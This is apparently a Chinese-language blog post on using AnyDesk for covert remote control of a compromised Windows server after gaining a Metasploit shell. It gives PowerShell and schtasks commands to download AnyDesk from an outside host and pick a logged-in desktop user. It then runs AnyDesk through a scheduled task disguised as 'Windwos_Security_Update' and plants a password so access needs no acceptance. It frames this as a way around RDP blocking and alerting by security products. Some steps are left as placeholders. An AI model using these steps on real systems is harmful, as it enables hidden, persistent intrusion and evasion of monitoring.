# 使用anydesk做远控


> anydesk是类似teamviewer的远程管理软件，但是他不用安装且体积小



### 场景举例

- 有云锁，护卫神等禁止3389登录时
- 类似阿里云这种，登录3389会报警
- 连接内网中可以出网的windows机器



### 注意事项

- 启动anydesk的权限需要桌面用户权限，比如，IIS做中间件的环境中，拿到了webshell一般都
  是没有桌面用户权限的，如果启动anydesk不会成功
- 启动anydesk时桌面不能被注销
- 有可能连接上去是黑屏，这个是因为该桌面用户退出远程桌面但没有注销，此时，除非能用
  winlogon启动anydesk，否则没法使用屏幕





### 使用方法

1. 习惯性的使用https://www.virustotal.com/gui扫描一下

2. 假设获取到了目标系统的一个msf的shell

   ```bash
   # 下载anydesk到一个公共目录下
   (New-Object System.Net.WebClient).DownloadFile("https://download.anydesk.com/AnyDesk.exe?_ga=2.176752485.1141763109.1599703967-925913843.1599703967","C:\Users\Public\Desktop\anydesk.exe")
   
   # 确定有哪些用户正在使用桌面???
   (((Get-WmiObject -Class Win32_Process -Filter 'Name="explorer.exe"').GetOwner().))
   
   # 启动一个计划任务，启动的用户为上个步骤选中的用户???
   schtasks /Create /TN Windwos_Security_Update /SC monthly /tr "c:\......"
   
   # 先执行一次计划任务，生成配置文件
   schtasks /run /tn Windwos_Security_Update
   
   # 等待几秒，等anydesk成功连接到网络，再把anydesk进程杀掉，dir看用户下面是否生成配置文件，然后再service.conf里面的添加密码(AnyDeskGetAccess)
   
   
   # 查看anydeskID并启动anydesk
   
   
   # 不需要到目标机器上点击接受，输入密码即可
   
   
   # 分享一个高权限webshell下可以使用的powershell脚本
   
   ```

<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/image-20200910104429278.png" ></img>

   

















































---

> 作者: [剑胆琴心](http://shuai06.github.io)  
> URL: https://shuai06.github.io/%E4%BD%BF%E7%94%A8anydesk%E5%81%9A%E8%BF%9C%E6%8E%A7/  

